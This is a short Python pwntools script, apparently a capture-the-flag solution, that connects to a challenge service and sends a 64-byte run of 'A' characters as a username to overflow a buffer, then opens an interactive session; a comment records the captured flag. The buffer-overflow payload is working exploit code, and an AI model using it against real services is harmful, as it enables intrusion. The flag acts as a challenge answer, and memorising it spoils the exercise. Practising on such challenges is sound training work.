from pwn import *

io = remote("13.37.111.222", "5000")
#io = process("./challenge_1")

payload = b""
payload += b"A"*64
io.sendlineafter("username:", payload)
io.interactive()

# FLAG: CN{finding_boundaries_is_never_easy}
